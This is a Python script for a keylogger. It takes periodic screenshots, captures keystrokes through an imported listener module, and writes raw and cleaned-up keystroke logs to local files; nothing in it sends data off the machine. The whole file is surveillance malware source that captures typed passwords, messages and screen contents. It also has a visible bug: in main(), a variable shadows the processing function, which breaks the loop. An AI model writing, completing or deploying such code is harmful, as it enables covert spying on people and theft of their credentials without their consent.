import os
from datetime import datetime
from key_listener import KeyListener
import sys
from PIL import ImageGrab
import re

# TODO threading para soportar capturas de pantalla cada x tiempo y captura de teclado cada y
# TODO error handling with the primary goal of not stopping the program

# --------------------- CONSTANTS --------------------- #

LOGS_DIR = 'keylogger/logs/'
LOG_FILE = 'log.txt'
LOG_FILE_2 = 'log_processed.txt'

IMG_DIR = 'keylogger/imgs/'
IMG_FILE = 'screenshot_'

TIME_OUT = 60 # period in seconds to capture data

# --------------------- FUNCTIONS --------------------- #


def write_to_log(message: str, log_name: str) -> bool:
    """
    Writes a message to a log file.

    Args:
        message: The message to be written to the log file.
        log_name: The name of the log file.

    Returns:
        True if the message was successfully written to the log file, False otherwise.
    """
    try:
        log_path = os.path.join(LOGS_DIR, log_name)

        if not os.path.exists(LOGS_DIR):
            os.makedirs(LOGS_DIR)
            print("Directory {} created successfully!".format(LOGS_DIR))

        if not os.path.exists(log_path):
            with open(log_path, 'w') as f:
                f.write('---- KEYLOGGER LOG ----\n')

        with open(log_path, 'a') as f:
            f.write(message)

        return True
    except Exception as e:
        print(e)
        return False


def format_message(content: str) -> str:
    """
    Format a message with the current date and a separator.

    Args:
        content (str): The content of the message.

    Returns:
        str: The formatted message with the current date and separator.
    """
    date = 'DATE: {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
    sep = '\n# ---------------------------------------------- #\n'

    return '{date}{sep}{content}{sep}\n'.format(date=date, content=content, sep=sep)


def process_keys(typed_keys):
    """
    Process the given string of typed keys and return a more legible version of it.

    Args:
        typed_keys (str): A string representing the typed keys.

    Returns:
        str: A string representing the processed keys.
    """

    processed_keys = re.sub(r'\[SPACE\]', ' ', typed_keys)
    processed_keys = re.sub(r'\[BACKSPACE\]', '^', processed_keys)
    processed_keys = re.sub(r'\[.*?\]', '', processed_keys)

    processed_keys = list(processed_keys)
    i = 0
    while i < len(processed_keys):
        if processed_keys[i] == '^':
            if i - 1 >= 0:
                processed_keys.pop(i-1)
                processed_keys.pop(i-1) 
                i -= 1  
            else:
                processed_keys.pop(i)  
        else:
            i += 1 

    return ''.join(processed_keys)


def take_screenshot():
    """
    Takes a screenshot and saves it as a PNG file in the specified directory.

    Returns:
        - True if the screenshot is successfully taken and saved.
        - False if an exception occurs during the process.

    Raises:
        - Exception: If an error occurs while taking or saving the screenshot.
    """
    try:
        if not os.path.exists(IMG_DIR):
            os.makedirs(IMG_DIR)
            print("Directory {} created successfully!".format(IMG_DIR))

        image_number = 1
        while os.path.isfile('{}{}'.format(IMG_DIR, IMG_FILE + str(image_number) + '.png')):
            image_number += 1

        im = ImageGrab.grab()
        image_name = '{}{}'.format(
            IMG_DIR, IMG_FILE + str(image_number) + '.png')
        im.save(image_name, 'png')

        return True
    except Exception as e:
        print(e)
        return False


def handle_keyboard_interrupt(key_listener):
    """
    Handle a keyboard interrupt event.

    Parameters:
        key_listener (Key_Listener): The key listener object that captures the typed keys.

    Returns:
        None
    """
    take_screenshot()
    typed_keys = key_listener.get_keys()
    processed_keys = process_keys(typed_keys)
    message = format_message(typed_keys)
    processed_message = format_message(processed_keys)
    write_to_log(message, LOG_FILE)
    write_to_log(processed_message, LOG_FILE_2)

    try:
        sys.exit(130)
    except SystemExit:
        os._exit(130)

# --------------------- MAIN --------------------- #


def main():
    key_listener = KeyListener()
    try:
        while True:
            take_screenshot()
            typed_keys = key_listener.read_keys(TIME_OUT)
            process_keys = process_keys(typed_keys)
            message = format_message(typed_keys)
            processed_message = format_message(process_keys)
            write_to_log(message, LOG_FILE)
            write_to_log(processed_message, LOG_FILE_2)
    except KeyboardInterrupt:
        handle_keyboard_interrupt(key_listener)


if __name__ == "__main__":
    main()
